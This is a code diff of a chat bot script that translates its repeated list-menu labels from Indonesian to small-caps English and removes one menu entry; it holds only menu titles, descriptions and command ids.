+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -7396,186 +7372,181 @@ const bet = {
 break
 case 'randomphotomenu': {let HydroSad = `${randomphotomenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -7588,186 +7559,181 @@ break
 case 'randomvideomenu': {
   let HydroSad = `${randomvideomenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -7780,186 +7746,181 @@ break
 case 'ephoto360menu': {
   let HydroSad = `${ephoto360menu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
